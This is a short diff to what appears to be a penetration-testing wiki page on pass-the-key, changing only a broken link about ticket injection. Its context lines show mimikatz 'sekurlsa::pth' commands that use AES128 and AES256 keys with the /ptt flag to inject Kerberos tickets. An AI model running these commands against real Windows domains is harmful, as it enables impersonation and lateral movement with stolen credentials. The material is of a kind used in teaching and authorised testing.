@@ -61,7 +61,7 @@ sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt
 sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt
 ```
 
-For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](broken-reference).
+For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
 {% endtab %}
 {% endtabs %}
 
